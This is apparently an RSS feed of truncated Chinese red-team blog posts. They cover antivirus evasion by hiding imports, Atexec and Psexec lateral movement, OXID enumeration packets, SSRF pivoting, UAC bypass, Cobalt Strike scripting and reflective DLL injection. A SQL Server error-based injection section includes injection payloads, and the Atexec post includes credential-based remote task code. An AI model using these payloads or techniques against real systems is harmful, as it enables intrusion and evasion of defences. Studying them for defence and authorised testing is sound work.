1 2 3 4 5 6 7 8 title 脚本代理 浏览器 -&amp;gt; 本地Socks代理服务 : （1）连接 本地Socks代理服务 &amp;lt;--&amp;gt; 本地HTTP客户端: （2）转换协议 本地HTTP客户端 -&amp;gt; Web服务器脚本: （3）不断请求 本地HTTP客户端 &amp;lt;-- Web服务器脚本: （4）发送响应 本地Socks代理服务&amp;lt;--&amp;gt; 本地HTTP客户端: （5）协议转换 本地Socks代理服务 --&amp;gt; 浏览器: （6）发送数据 note right: 倾旋的博客:https://payloads.</description></item><item><title>静态恶意代码逃逸（第七课）</title><link>https://payloads.online/archivers/2020-10-23/1/</link><pubDate>Fri, 23 Oct 2020 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2020-10-23/1/</guid><description>代码将会上传至Github，方便读者下载研究 : https://github.com/Rvn0xsy/BadCode
0x01 导入地址表（IAT） Import Address Table 由于导入函数就是被程序调用但其执行代码又不在程序中的函数，这些函数的代码位于一个或者多个DLL 中，当PE 文件被装入内存的时候，Windows 装载器才将DLL 装入，并将调用导入函数的指令和函数实际所处的地址联系起来(动态连接)，这操作就需要导入表完成.其中导入地址表就指示函数实际地址。 - 来源百度百科
如下图所示：
在PE结构中，存在一个导入表，导入表中声明了这个PE文件会载入哪些模块，同时每个模块的结构中又会指向模块中的一些函数名称。这样的组织关系是为了告诉操作系统这些函数的地址在哪里，方便修正调用地址。
站在反病毒的角度提出假想：既然所有的PE文件都有导入表，并且声明了一些模块，并且还能通过模块找到导入函数的名称，那么是否能够作为一个文件的风险值的评估方向？
方法论：
如果一个文件的文件大小在300KB以内，并且导入函数又有Virtual Alloc、CreateThread，且VirtualAlloc的最后一个参数是0x40，那么此文件是高危文件。
0x40被定义在winnt.h中：
1 2 3 4 5 6 7 8 #define PAGE_NOACCESS 0x01 #define PAGE_READONLY 0x02 #define PAGE_READWRITE 0x04 #define PAGE_WRITECOPY 0x08 #define PAGE_EXECUTE 0x10 #define PAGE_EXECUTE_READ 0x20 #define PAGE_EXECUTE_READWRITE 0x40 #define PAGE_EXECUTE_WRITECOPY 0x80 看一下第一课代码编译出来的PE导出表：
根据这个猜想，我们开始尝试在PE文件中抹去导入函数名称。
0x02 GetProcAddress获取函数地址 GetProcAddress这个API在Kernel32.dll中被导出，主要功能是从一个加载的模块中获取函数的地址。
函数声明如下：
1 2 3 4 FARPROC GetProcAddress( HMODULE hModule, // 模块句柄 LPCSTR lpProcName // 函数名称 ); FARPROC被定义在了minwindef.</description></item><item><title>这是一个充满挑战的好时代</title><link>https://payloads.online/archivers/2020-08-24/1/</link><pubDate>Mon, 24 Aug 2020 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2020-08-24/1/</guid><description>我经常会写一些不着边际的东西，从我博客文章就可以看出现在的风格，前言不搭后语、文章主体和内容松散不一，说来惭愧，文化程度不高，也想抽空读读书花点功夫补缺一下。
近期发生了很多的事儿，很多时候在晚上会产生一些感触，但是都没有把它们给记录下来，现在点来一支烟，慢慢回忆……
第一个思考：我感受到了自动化时代的冲击 听闻关于演练的消息，也就一天时间，不知消息真假的情况下开始推论参赛厂商的自动化覆盖程度，发现整个行业的意识形态已经建立，未来（或已经存在的）漏洞战争的趋势已经开始逼近。
关于自动化的设计，我们早期已经着手将基本的信息获取、清洗、统计、归类、存储整个过程完成，但就此一战，能很明显的发现自动化是有阶段的，我们还处于第一阶段。起初，我们为了加速红队的“行动”，做了诸多的考虑。我认为，为了完成整个行动的自动化是不太现实的，难点在于经验如何转化为机器的逻辑。步子不能迈的太大，我先分解一下我理想的自动化阶段。
第一阶段：单从基本信息收集的具备 涉及多个维度，域名、子域名、IP、系统、端口、服务、Http服务相关组件等，互联网上的大部分工具、平台可能大部分已经满足这些最小颗粒度，但有些工具、平台就是偏离真正的需求。
第二阶段：基本信息收集的数据支撑 同样涉及多个角度，主动扫描、网络空间搜索引擎数据接口、组件指纹精准度、识别技术方案等。未来主动扫描可能用的会越来越少，依赖接口的会更多一些，接口只要更加实时的更新数据即可，然后确保构建好指纹的精准度，做到不漏掉一处资产的特征就很成功了。最早接触的一个网络空间搜索引擎是Shodan，我经过查阅Wiki百科发现它最早在2013年做起来，距今已经7年，在常规的渗透中，也会偶尔使用它来寻找一些有趣的资产，在IPV4的时代下，它已经算是一个“活地图”了，这里可以思考一个有趣的问题，当世界上更普遍使用IPv6以后，是否还会有类似的“活地图”呢？
第三阶段：启发式漏洞的定位发现 最初这个概念是我在参与团队内部平台建设讨论时提出的，其实也不是什么新词，为了应对这个建立了大大小小的SOC（Security operations center，安全运营中心）时代，我们需要把历史的扫描器丢弃，把攻击的特征降噪、剔除更多漏洞利用的唯一性，第一步就要将漏洞的发现理解为单纯的“发现”，而非“发现”与“利用”在一起去理解。例如，某个系统存在RCE（Remote Code Execution Vulnerability，远程代码执行漏洞），利用条件是要向网站某个接口POST一段数据：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 &amp;gt; POST /handler/ HTTP/1.1 &amp;gt; Host: 192.168.0.1 &amp;gt; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36 &amp;gt; Accept: */* &amp;gt; Content-Length: 8 &amp;gt; Content-Type: application/x-www-form-urlencoded data={&amp;#39;username&amp;#39;:&amp;#39;code&amp;#39;} &amp;lt; HTTP/1.1 200 OK &amp;lt; Content-Type: text/html &amp;lt; Server: Microsoft-IIS/7.</description></item><item><title>通过OXID解析器获取Windows远程主机上网卡地址</title><link>https://payloads.online/archivers/2020-07-16/1/</link><pubDate>Thu, 16 Jul 2020 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2020-07-16/1/</guid><description>0x00 背景 Nicolas Delhaye在AIRBUS上分享了一篇The OXID Resolver [Part 1] – Remote enumeration of network interfaces without any authentication，通过这篇文章我们可以掌握通过Windows的一些DCOM接口进行网卡进行信息枚举，它最大的魅力在于无需认证，只要目标的135端口开放即可获得信息。
0x01 OXID Resolver - 交互过程分析 OXID Resolver是在支持COM +的每台计算机上运行的服务。
它执行两项重要职责：
它存储与远程对象连接所需的RPC字符串绑定，并将其提供给本地客户端。 它将ping消息发送到本地计算机具有客户端的远程对象，并接收在本地计算机上运行的对象的ping消息。OXID解析器的此方面支持COM +垃圾回收机制。 Nicolas Delhaye在原文提供的脚本是需要依赖imapcket的，而我只关注在Socket RAW上的实现，这样能够减小工具的体积，并且其他语言也能够轻松复刻整个过程。
这个协议Wireshark已经内置了，我们可以直接进行抓包分析。
前三个不需要关注，主要是TCP的三次握手，后面的四次交互才是我们需要重点关注的。
第一个数据包 72 Bytes （主要用于协商版本等等）：
1 \x05\x00\x0b\x03\x10\x00\x00\x00\x48\x00\x00\x00\x01\x00\x00\x00\xb8\x10\xb8\x10\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00\xc4\xfe\xfc\x99\x60\x52\x1b\x10\xbb\xcb\x00\xaa\x00\x21\x34\x7a\x00\x00\x00\x00\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00\x2b\x10\x48\x60\x02\x00\x00\x00 第二个数据包：
这个包无需关注，因为我们最终要获得的是第四个数据包。
1 2 3 4 &amp;#34;\x05\x00\x0c\x03\x10\x00\x00\x00\x3c\x00\x00\x00\x01\x00\x00\x00&amp;#34; \ &amp;#34;\xb8\x10\xb8\x10\x0a\x13\x00\x00\x04\x00\x31\x33\x35\x00\x00\x00&amp;#34; \ &amp;#34;\x01\x00\x00\x00\x00\x00\x00\x00\x04\x5d\x88\x8a\xeb\x1c\xc9\x11&amp;#34; \ &amp;#34;\x9f\xe8\x08\x00\x2b\x10\x48\x60\x02\x00\x00\x00&amp;#34; 可以选中对应的节点，直接复制... as Escaped String，这样就能够拿到十六进制Code。
第三个数据包：
1 2 &amp;#34;\x05\x00\x00\x03\x10\x00\x00\x00\x18\x00\x00\x00\x01\x00\x00\x00&amp;#34; \ &amp;#34;\x00\x00\x00\x00\x00\x00\x05\x00&amp;#34; 第四个数据包：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 &amp;#34;\x05\x00\x02\x03\x10\x00\x00\x00\xec\x00\x00\x00\x01\x00\x00\x00&amp;#34; \ &amp;#34;\xd4\x00\x00\x00\x00\x00\x00\x00\x05\x00\x07\x00\x00\x00\x02\x00&amp;#34; \ &amp;#34;\x5d\x00\x00\x00\x5d\x00\x47\x00\x07\x00\x44\x00\x45\x00\x53\x00&amp;#34; \ &amp;#34;\x4b\x00\x54\x00\x4f\x00\x50\x00\x2d\x00\x41\x00\x44\x00\x47\x00&amp;#34; \ &amp;#34;\x33\x00\x33\x00\x31\x00\x32\x00\x00\x00\x07\x00\x31\x00\x39\x00&amp;#34; \ &amp;#34;\x32\x00\x2e\x00\x31\x00\x36\x00\x38\x00\x2e\x00\x38\x00\x30\x00&amp;#34; \ &amp;#34;\x2e\x00\x31\x00\x00\x00\x07\x00\x31\x00\x39\x00\x32\x00\x2e\x00&amp;#34; \ &amp;#34;\x31\x00\x36\x00\x38\x00\x2e\x00\x32\x00\x30\x00\x31\x00\x2e\x00&amp;#34; \ &amp;#34;\x31\x00\x00\x00\x07\x00\x31\x00\x30\x00\x2e\x00\x32\x00\x30\x00&amp;#34; \ &amp;#34;\x2e\x00\x35\x00\x36\x00\x2e\x00\x38\x00\x33\x00\x00\x00\x07\x00&amp;#34; \ &amp;#34;\x31\x00\x3a\x00\x3a\x00\x32\x00\x35\x00\x36\x00\x3a\x00\x66\x00&amp;#34; \ &amp;#34;\x64\x00\x00\x00\x00\x00\x09\x00\xff\xff\x00\x00\x1e\x00\xff\xff&amp;#34; \ &amp;#34;\x00\x00\x10\x00\xff\xff\x00\x00\x0a\x00\xff\xff\x00\x00\x16\x00&amp;#34; \ &amp;#34;\xff\xff\x00\x00\x1f\x00\xff\xff\x00\x00\x0e\x00\xff\xff\x00\x00&amp;#34; \ &amp;#34;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&amp;#34; 第四个数据包返回的永远是不定长的数据，所以需要参考文档进行解析，我下载了一份包含了OXID的文档，看起来非常的吃力，虽然有结构体，但是并没有给出一个通用的解决方案。</description></item><item><title>如何实现一个Atexec</title><link>https://payloads.online/archivers/2020-06-28/1/</link><pubDate>Sun, 28 Jun 2020 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2020-06-28/1/</guid><description>0x01 Atexec，一种横向方式 Atexec是一个除了Psexec以外，被高频使用的横向方式，该技术手段主要通过任务计划实现，与时间有关。
Atexec的主要特点是通过135端口进行任务计划任务的创建，同时通过445端口进行SMB认证，取回命令执行的结果。
0x02 执行过程 首先，我们用成品来进行一次命令执行：
执行完成，能够看到whoami的结果是SYSTEM权限，通过流量上分析：
首先，源主机192.168.164.1向目标主机192.168.164.140的135端口建立连接，由于是RPC协议，所以会进行一次端口随机的协商，于是源主机端口变成57523，目标主机源端口变成49154，这使得流量设备在数据传输上不能轻易的监控传输内容。
紧接着，源主机向目标主机进行SMB认证，完成文件的读取（命令执行结果），最终断开连接。
在操作系统的事件查看器中，**（默认情况下）**仅仅捕获了几条Windows认证的日志，关于服务、文件操作、应用程序等都没有相关日志。
0x03 实现过程 要实现一个Atexec并不难，首先需要梳理一下实现思路，第一步需要根据提供的凭证创建任务计划，然后程序等待任务计划完成后，获取任务计划的执行结果。
如何远程创建任务计划？ 这里主要涉及到COM组件的操作，我用封装函数的方式来实现使得程序可读性变高。
使用凭证连接远程主机的任务计划接口：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 BOOL ConnectTaskServer(LPCWSTR lpwsHost, LPCWSTR lpwDomain,LPCWSTR lpwsUserName, LPCWSTR lpwsPassword) { // 初始化COM组件 hr = CoInitializeEx(NULL, COINIT_MULTITHREADED); // 设置组件安全等级 hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL); // 创建任务服务容器 hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&amp;amp;pService); // 连接目标服务器为远程连接或本地服务器 hr = pService-&amp;gt;Connect(_variant_t(lpwsHost), _variant_t(lpwsUserName), _variant_t(lpwDomain), _variant_t(lpwsPassword));	//默认本地 if (FAILED(hr)) { printf(&amp;#34;ITaskService::Connect failed: %x \n&amp;#34;, hr); pService-&amp;gt;Release(); CoUninitialize(); return FALSE; } return TRUE; } Task Scheduler提供了许多函数及接口来操作任务计划，但是凡是涉及COM组件的操作，都变得有些复杂，但至少实现Atexec涉及到的知识点并不多。</description></item><item><title>如何实现一个Psexec</title><link>https://payloads.online/archivers/2020-04-02/1/</link><pubDate>Thu, 02 Apr 2020 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2020-04-02/1/</guid><description>0x01 Psexec Psexec被编写的初衷是为了方便服务器管理员管理大量的机器而开发的，但由于它的便捷，同时也被黑客使用。
相信很多人都用过Psexec这款工具了，它由Sysinternals网站提供，Sysinternals这个网站由Mark Russinovich于1996年创建，用于托管他的高级系统实用程序和技术信息。
下载地址：https://docs.microsoft.com/en-us/sysinternals/downloads/psexec
高级用法：https://www.itprotoday.com/compute-engines/psexec
0x02 Psexec的执行原理 为了清楚的了解它的执行原理,我们先从日志看起。
环境：
Windows 2008 R2 X64 → 192.168.3.130（以下简称Win2008） Kali Linux 2019.4 → 192.168.3.145（以下简称Kali） Windows 10 → 192.168.3.1（以下简称Win10） 下载SysinternalsSuite： https://download.sysinternals.com/files/SysinternalsSuite.zip
首先在Windows 10上对Windows 2008 R2 X64这台机器进行Psexec
1 .\PsExec.exe \\192.168.3.130 -u administrator -p 123456 cmd 查看安全日志 打开Win2008日志查看器，先查看安全（Security）日志：
从日志查看器能够看到产生了多个安全审核日志，事件ID：4624，并且能够看到来源IP以及计算机名。
认证类型NTLM：
接着，还有事件ID为4648的日志，该条目的解释是：
在进程尝试通过显式指定帐户的凭据来登录该帐户时生成此事件。这通常发生在批量类型的配置中(例如计划任务) 或者使用 RUNAS 命令时。
可以看到很明显的PSEXECSVC.exe这个程序被启动。
目前可以猜测：先进行Windows 认证，然后产生PSEXESVC.exe并启动。
查看系统日志 事件ID：7045向系统报告了一个名为“PSEXESVC”的服务被安装，同时紧接着事件ID：7036报告“PSEXESVC服务已经启动”。
通过事件ID报告的顺序，我们大致了解了PsEXEC的动作。
事件ID：4624 事件ID：4648 事件ID：7045 事件ID：7036 当PsExec执行exit退出交互式命令行后，会向系统报告事件ID：4634注销事件、事件ID：7036 PSEXESVC服务停止。
0x03 从网络分析Psexec利用过程 这里我使用Wireshark抓包工具，捕获了整个Psexec建立网络连接到exit退出的整个过程。
认证大致流程：
192.168.3.1向192.168.3.130　进行三次握手 192.168.3.1向192.168.3.130　协商认证方式 192.</description></item><item><title>SSRF漏洞配合Flask的巧妙利用 - 内网漫游</title><link>https://payloads.online/archivers/2020-03-21/2/</link><pubDate>Sat, 21 Mar 2020 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2020-03-21/2/</guid><description>SSRF 服务器请求伪造 SSRF(Server-side Request Forge, 服务端请求伪造)。由攻击者构造的攻击链接传给服务端执行造成的漏洞，一般用来在外网探测或攻击内网服务。
常见的功能点 Net-NTLM &amp;amp;&amp;amp; NTLM Relay 获取服务器真实IP 端口扫描 网页代理 &amp;hellip;&amp;hellip; 网页代理 - HTTP Proxy 客户端应用HTTP代理后，可通过代理服务器访问内网HTTP协议资源
而在SSRF场景，需要SSRF具备支持HTTP两大请求方式：GET、POST，且有响应Body
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 POST /application/services/proxy/doPostAndGet HTTP/1.1 Host: app.domain.com Connection: keep-alive Content-Length: XX Content-Type: application/json Accept: */* Referer: http://app.domain.com/application/portal/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 { &amp;#34;url&amp;#34;:&amp;#34;http://domain.com/sso?login&amp;#34;, &amp;#34;method&amp;#34;:&amp;#34;post&amp;#34;, &amp;#34;jsonBody&amp;#34;:&amp;#34;{\&amp;#34;username\&amp;#34;:\&amp;#34;123456\&amp;#34;}&amp;#34; } Flask 框架 Flask是一个用Python编写的Web应用程序框架，它基于Werkzeug WSGI工具包和Jinja2模板引擎。
Flask也被称为“microframework” ，因为它使用简单的核心，用extension增加其他功能，它没有默认使用的数据库、窗体验证工具。
1 2 3 4 5 6 from flask import Flask app = Flask(__name__) @app.</description></item><item><title>Windows特权提升漏洞-符号</title><link>https://payloads.online/archivers/2020-03-21/1/</link><pubDate>Sat, 21 Mar 2020 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2020-03-21/1/</guid><description>0X01 Windows 特权提升漏洞分类 Windows 特权提升相信大家已经不陌生了，常见的场景如：NETWORK SERVICE → SYSTEM
但从漏洞原理去了解，会发现利用漏洞利用本就是一个“使程序逻辑不按照正常方向运转”的过程。
许多需要构建多个苛刻条件的Windows底层漏洞发现绝非偶然，也有许多Windows漏洞的发现是纯属偶然，它们是那么的容易可以利用，并且危害巨大。
从研究成本，我根据自己的理解将Windows漏洞分为以下几类：
Windows内核、服务的底层漏洞（需要长时间的Fuzz跟踪以及很深厚的基础知识） Windows服务、相关软件生态的权限控制不当产生的漏洞 Windows开发者自己本身都未想到过的逻辑漏洞 以上3种可能是一个不严谨的分类，但作为一个理解铺垫是足够了。
0X02 权限（特权）与进程的关系 - 访问控制模型 访问控制模型有两个主要的组成部分，访问令牌（Access Token）和安全描述符（Security Descriptor），它们分别是访问者和被访问者拥有的东西。通过访问令牌和安全描述符的内容，Windows可以确定持有令牌的访问者能否访问持有安全描述符的对象。
访问令牌是与特定的Windows账户关联的。当一个Windows账户登录的时候，系统会从内部数据库里读取该账户的信息，然后使用这些信息生成一个访问令牌。在该账户环境下启动的进程，都会获得这个令牌的一个副本，进程中的线程默认持有这个令牌。线程要想去访问某个对象，或者执行某些系统管理相关的操作时，Windows就会使用这个线程持有的令牌进行访问检查。
安全描述符是与被访问对象关联的，它含有这个对象所有者的SID，以及一个访问控制列表（ACL，Access Control List），访问控制列表又包括了DACL（Discretionary Access Control List）和SACL（System Access Control List）——目前还不知道这两个东西的确切翻译——其中，**DACL是安全描述符中最重要的，它里面包含零个或多个访问控制项（ACE，Access Control Entry），每个访问控制项的内容描述了允许或拒绝特定账户对这个对象执行特定操作。**至于SACL，它很少用到，主要是用于系统审计的，它的内容指定了当特定账户对这个对象执行特定操作时，记录到系统日志中。
如文件，点击右键选择“属性”，找到“安全”选项卡，点击“高级”按钮。弹出的对话筐中，“权限”选项卡就是DACL，&amp;ldquo;审核&amp;quot;选项卡是SACL，“所有者”是Owner、Group。
访问令牌中主要含有以下的内容：
当前登录账户的SID，也就是与令牌关联的账户的SID 当前登录账户所属的账户组的SID列表 受限制的SID（Restricted SID）列表 当前登录账户以及它所属账户组的权限（Privileges）列表 SID（Security Identity）是Windows中每个账户和账户组都有的一个标识符，平常我们看到的Administrator，Users等账户或者账户组在Windows内部是使用SID来标识的。例如S-1-5-21-1004336348-1275210071-725345543-1003就是一个完整的SID。每个SID在同一个系统中都是唯一的。
再来看看安全描述符中ACE的具体内容：
特定账户或者账户组的SID； 一个访问掩码（Access Mask），该掩码指定了具体的访问权限（Access Rights），也就是可以对该对象执行的操作； 一个位标记，指示了这个ACE的类型； 一组位标记，指示了安全描述符所属对象的子对象是否继承这个ACE； 所有的可访问对象都有三种ACE，分别是Access-denied ACE，Access-allowed ACE，System-audit ACE。Access-denied ACE用于拒绝账户访问，Access-allowed ACE用于允许账户访问，而System-audit ACE用于SACL中。
当一个线程尝试去访问一个对象时，系统会检查线程持有的令牌以及被访问对象的安全描述符中的DACL。如果安全描述符中不存在DACL，则系统会允许线程进行访问。
如果存在DACL，系统会顺序遍历DACL中的每个ACE，检查ACE中的SID在线程的令牌中是否存在。
当满足以下条件时，遍历会终止：
某个Access-denied ACE中的SID在线程令牌中存在，而且该ACE中的权限与线程要求的权限相符，此时系统拒绝该线程访问对象。
某个Access-allowed ACE中的SID在线程令牌中存在，而且该ACE中的权限与线程要求的权限相符，此时系统允许线程访问对象。所有ACE中的SID在线程令牌中均不存在，此时系统拒绝线程访问对象。
下图是转自MSDN的，Object对象的DACL中含有三个ACE：
第一个ACE拒绝Andrew账户对Object进行读取，写入和执行操作； 第二个ACE允许Group A账户组中的所有账户对Object进行写入操作； 第三个ACE允许任何账户对Object进行读取和执行操作； 线程A试图访问Object，在遍历DACL的时候，遇到第一个ACE，满足上述的条件，遍历终止，线程A被拒绝访问Object，尽管线程A的访问令牌中含有Group A账户组的SID，并满足第二个ACE。同理，第三个ACE也没有被检查。对于线程B的分析是一样的，这里就不啰嗦了。可见ACE的排列顺序对线程能否访问对象是很重要的。</description></item><item><title>Cobalt Strike Aggressor Script （第一课）</title><link>https://payloads.online/archivers/2020-03-02/4/</link><pubDate>Mon, 02 Mar 2020 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2020-03-02/4/</guid><description>前言 在后渗透阶段，目前较为流行的C2平台就属Cobalt Strike做的比较优秀了；目前国内的论坛、网站上已经放出很多版本，最新的为Cobalt Strike 3.14，目前最新版本4.0已不再有试用版。
起初我刚接触Cobalt Strike时，觉得非常不习惯，从Metasploit萌新走来，觉得这个图形化软件远远比不上Metasploit的模块丰富，后经过长时间的使用以及研究，从这个项目中学习到了很多技术，被开发者的思想所折服，应该算比较超前的一款值得学习的平台了。
Aggressor Script Aggressor Script是Cobalt Strike 3.0版本以上的一个内置脚本语言，由Sleep语言解析，Cobalt Strike 3.0以上版本的菜单、选项、事件都由default.cna构建。红队人员可以通过它来调用一些IRC、Webhook接口去对接机器人，实现自动化渗透与监控，Aggressor Script是Cobalt Strike这款C2平台的画龙点睛之笔。
对于Python、C/C++爱好者来说，Sleep语言一开始接触的时候感觉很奇怪，会有很多想吐槽的点，但久而久之，就会发现它的便捷之处。
安装Sleep语言环境 为了快速掌握Aggressor Script，需要先掌握和熟悉一些Sleep的语法，不然遇到错误无法发现自己错在哪里。
Sleep语言下载地址：http://sleep.dashnine.org/download/sleep.jar
启动Sleep脚本语言解释器：
java -jar sleep.jar
Sleep语言数据类型 数字 字符串 Arrays Lists Stacks Sets Hashs Sleep语法手册：http://sleep.dashnine.org/manual/
这里主要介绍一些特殊的数据类型：Stacks、Lists、Hashs
Array数据类型支持多种数据存放在一起，也就是说Array是一个复合数据类型；
例如：
1 2 3 # create a List @foo = @(&amp;#39;foo&amp;#39;,123.0,&amp;#39;bar&amp;#39;); println(@foo[0]) 遍历：
1 2 3 4 5 @foo = @(&amp;#39;foo&amp;#39;,123.0,&amp;#39;bar&amp;#39;); foreach $var (@foo) { println($var); } Stacks 栈 - “后进先出”
1 2 3 4 5 6 7 8 9 # create a Stacks push(@stack, &amp;#34;apple&amp;#34;); push(@stack, &amp;#34;banana&amp;#34;); push(@stack, &amp;#34;cucumber&amp;#34;); println(&amp;#34;Stack is: &amp;#34; .</description></item><item><title>Cobalt Strike Aggressor Script （第二课）</title><link>https://payloads.online/archivers/2020-03-02/5/</link><pubDate>Mon, 02 Mar 2020 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2020-03-02/5/</guid><description>基础菜单 以popup当做修饰符号的函数体是菜单，一般是Cobalt Strike的菜单栏；
先构建一个简单的菜单：
1 2 3 4 5 6 popup event_say { item(&amp;#34;&amp;amp;Say&amp;#34;, { # 函数体 }); separator(); #分割线 } 一个菜单可以有多个item，也就是多个元素，元素中可以写动作代码，也可以写函数。
1 2 3 4 5 6 popup event_say { item(&amp;#34;&amp;amp;Say&amp;#34;, { say(); }); separator(); } 紧接着还有一个重要的菜单函数：menubar(&amp;quot;Event-Say&amp;quot;, &amp;quot;event_say&amp;quot;);
第一个参数是菜单名称，第二个是函数名称，这个函数通过参数将菜单名称与函数名绑定起来。
日志函数 通过elog函数可以打印事件日志：
1 elog(&amp;#34;something ...&amp;#34;); 我们可以封装一个函数，名为say：
1 2 3 sub say { elog(&amp;#34;\c3Hello Everyone!&amp;#34;); } \c是Cobalt Strike的彩色样式开关，类似的还有其他颜色：
执行结果：
对话框-输入 1 2 3 dialog(&amp;#34;Hello&amp;#34;, # 对话框标题-字符串 %(name =&amp;gt; &amp;#34;tom&amp;#34;), # 对话框输入项及默认值-hashes &amp;amp;callback); # 对话框点击完成后的回调函数 这里我实现了一个输入框，并将输入框的值通过elog打印出来：</description></item><item><title>SQL Server注入 - STUFF与XML Path</title><link>https://payloads.online/archivers/2020-03-02/3/</link><pubDate>Mon, 02 Mar 2020 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2020-03-02/3/</guid><description>背景 某次XX，发现一处SQL Server注入点
报错注入 SQL Server注入，一般也是先找库、再找表、再查字段、最终查询数据。
查库 1.查第一个：
1 id=1 and (SELECT top 1 Name FROM Master..SysDatabases)&amp;gt;0 -- 2.NOT IN
1 id=1 and (SELECT top 1 Name FROM Master..SysDatabases where name not in (&amp;#39;master&amp;#39;))&amp;gt;0 -- 其中，NOT IN的集合会不断增加，最终无法查出其他结果，那么这个集合就是所有的数据库名称。
查表 在这一步，我们就可以自动化实现了：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import requests import re table_list = [&amp;#39;&amp;#39;] def get_sqlserver_table(table_list, table_num): for num in range(0,table_num): # print(&amp;#34;&amp;#39;,&amp;#39;&amp;#34;.</description></item><item><title>红队分享-如何挖掘Windows Bypass UAC（第一课）</title><link>https://payloads.online/archivers/2020-03-02/2/</link><pubDate>Mon, 02 Mar 2020 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2020-03-02/2/</guid><description>什么是UAC 用户帐户控制（User Account Control，简写作UAC)是微软公司在其Windows Vista及更高版本操作系统中采用的一种控制机制。其原理是通知用户是否对应用程序使用硬盘驱动器和系统文件授权，以达到帮助阻止恶意程序（有时也称为“恶意软件”）损坏系统的效果。
先观察一下：
在Windows 7下打开注册表 在Windows 7上管理计算机 在Windows 10上管理计算机 有的需要授权、有的不需要，是因为UAC是分授权等级的：
首先请按Win+R，输入gpedit.msc，打开组策略。
然后我们在左侧窗口找到“计算机配置&amp;ndash;Windows设置&amp;ndash;安全设置&amp;ndash;本地策略&amp;ndash;安全选项”，再在右侧窗口找到“用户帐户控制： 管理员批准模式中管理员的提升权限提示的行为”，双击该条目，打开设置窗口，如下图：
不提示直接提升：关闭UAC，需要权限时直接提升权限。 在安全桌面上提示凭据：需要权限时在安全桌面上输入管理员密码提升权限。 在安全桌面上同意提示：需要权限时在安全桌面上选择“允许”提升权限。 提示凭据：需要权限时在普通窗口中输入管理员密码提升权限。 同意提示：需要权限时在普通窗口中选择“允许”提升权限。 非 Windows 二进制文件的同意提示：(默认设置)当非 Microsoft 应用程序的某个操作需要提升权限时，选择“允许”提升权限。 为什么有的应用程序不需要提示UAC？ 因为普通应用执行权限有限，某些操作必然会要求更高的管理员权限。此时，通常就需要一个权限提升的操作。程序可以向系统请求提权，系统会将此请求通过提一个提示框，请用户确认。
如果当前用户的用户组权限不是管理员，提权操作是要求输入管理员密码的，这点和在Linux中的相应操作类似。
程序只能在运行前要求提权。如果已经在运行了，那么将失去申请提权的能力 权限提升仅对此次进程有效 提升权限的操作大致有两个：
自动提权请求 手动提权请求 手动提权就是“以管理员身份运行”，自动提权请求就是程序本身就一运行就开始申请权限，如：注册表编辑器
在开发的过程中，程序员若要开发一个程序，可以在编译器配置，写入一个配置文件，用于向系统标识该应用程序是必须要管理员权限运行的。
manifest文件 这个文件本质上是一个XML文件，用于标识当前应用程序的配置属性。
aslnvoker 默认权限 highestAvailable 最高权限 requireAdministrator 必须是管理员权限 我编译选项调整为requireAdministrator,当用户运行程序后,将获得管理员权限会话,不需要绕过UAC了。
manifest中其实还有其他属性，如：autoElevate（自动提升）
拥有自动权限提升属性的文件，当默认以管理员权限运行，不需要经过用户的授权。
寻找auto Elevate 工具地址：https://github.com/g3rzi/Manifesto
通过不断遍历autoElevate属性，寻找自动权限提升的程序。
我使用Powershell启动：C:\Windows\system32\eudcedit.exe
发现没有弹出UAC确认，没有继承Powershell的权限，它的权限是High。
假设，如果C:\Windows\system32\eudcedit.exe存在一个DLL劫持漏洞，那么普通用户就可以用低权限绕过UAC确认，以高权限执行任意代码。
手动Bypass UAC C:\Windows\system32\odbcad32.exe 该程序用于配置ODBC数据源，但提供了一个输入点，那就是文件浏览器，通过文件浏览器我们可以打开一个管理员权限的Powershell。
使用Powershell启动其他程序，也都是以管理员权限运行：
下一章，将分析几个UAC的绕过例子。</description></item><item><title>通过反射DLL注入来构建后渗透模块（第一课）</title><link>https://payloads.online/archivers/2020-03-02/1/</link><pubDate>Mon, 02 Mar 2020 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2020-03-02/1/</guid><description>Aggressor Script Aggressor Script是Cobalt Strike 3.0版本以上的一个内置脚本语言，由Sleep语言解析，Cobalt Strike 3.0以上版本的菜单、选项、事件都由default.cna构建。红队人员可以通过它来调用一些IRC、Webhook接口去对接机器人，实现自动化渗透与监控，Aggressor Script是Cobalt Strike这款C2平台的画龙点睛之笔。
对于Python、C/C++爱好者来说，Sleep语言一开始接触的时候感觉很奇怪，会有很多想吐槽的点，但久而久之，就会发现它的便捷之处。
反射 DLL注入 Aggressor Script脚本提供了一些关于反射DLL的接口：https://cobaltstrike.com/aggressor-script/functions.html#bdllspawn
话不多说，先上代码：
